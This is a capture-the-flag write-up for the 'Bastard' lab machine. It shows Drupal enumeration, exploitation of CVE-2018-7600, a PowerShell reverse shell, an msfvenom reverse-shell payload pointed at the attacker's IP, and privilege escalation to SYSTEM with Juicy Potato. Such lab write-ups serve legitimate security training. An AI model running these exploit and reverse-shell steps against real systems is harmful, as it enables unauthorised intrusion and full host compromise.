# Bastard 
## Enumeration

Starting with a nmap scan I find three open ports 

```bash
$ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.9 -oG allPorts -vvvv
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127
```

Visiting the port 80 I find a drupal login panel

![Desktop View](.gitbook/assets/img/htb/bastard/drupal_login_1.png)


doing a curl to the changelog.txt I'm able to enumerate the version which in this case is 7.54
```bash
$ curl -s -X GET http://10.10.10.9/CHANGELOG.txt  | head

Drupal 7.54, 2017-02-01
-----------------------
```

## shell as iusr 

searching for some exploits I find this [CVE-2018-7600](https://github.com/pimps/CVE-2018-7600) that allows me to get remote command execution on the machine 

```bash
$ python drupa7-CVE-2018-7600.py -c 'whoami' http://10.10.10.9/
[*] Triggering exploit to execute: whoami
nt authority\iusr
```

To get a stable shell I use the base64 powershell reverse shell from [revshells](https://www.revshells.com/) I start a nc listener on port 9001 and receive the connection

```sh
$ python drupa7-CVE-2018-7600.py -c 'powershell -e JABjAGwAa...' http://10.10.10.9/
```

```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.9] 51840

PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> 
```

Enumerating privileges I see that the seimpersonate privilege is enabled which might allow me to use a juicy potato or a similar exploit to elevate privileges

```bash
PS C:\inetpub\drupal-7.54> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
PS C:\inetpub\drupal-7.54> 
```

## shell as nt authority\system

I create a shell.exe file with msfvenom that will give me a reverse shell 

```shell
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f exe -o shell.exe
```

I download juicy potato and the shell.exe executable files into the target machine 

```sh
PS C:\windows\temp\x> copy \\10.10.14.13\smbfolder\shell.exe . 
PS C:\windows\temp\x> copy \\10.10.14.13\smbfolder\jp.exe .
```

I start another nc listener on port 9001 and then I try to run jp.exe with the program shell.exe but it fails

```sh
PS C:\windows\temp\x> .\jp.exe -t * -l 1337 -p .\shell.exe 
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
```

The reason is that the clsid is wrong so I look for a valid one [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise) I retry the exploit two times until it gives an "OK" response
```shell
PS C:\windows\temp\x> .\jp.exe -t * -l 1337 -p ".\shell.exe" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337
...........................................
PS C:\windows\temp\x> .\jp.exe -t * -l 1337 -p ".\shell.exe" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\windows\temp\x> 
```

and finally I receive a shell as nt authority\system

```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.9] 63808
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


